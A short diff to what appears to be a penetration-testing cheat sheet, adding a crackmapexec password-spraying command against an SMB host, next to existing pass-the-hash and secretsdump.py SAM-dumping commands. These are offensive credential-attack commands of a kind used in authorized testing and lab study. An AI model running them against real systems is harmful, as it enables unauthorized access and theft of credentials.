@@ -76,6 +76,10 @@ Pass the Hash [https://meriemlarouim.medium.com/pass-the-hash-gaining-access-wit
 --------------------------------------------------------
 > crackmapexec smb <ip/cidr> -u <user> -H <HASH> --local-auth
 
+Password SPraying
+------------------------------------------------------------
+> crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
+
 Dump Local Hashes (SAM)
 --------------------------------------------------------
 > secretsdump.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP>
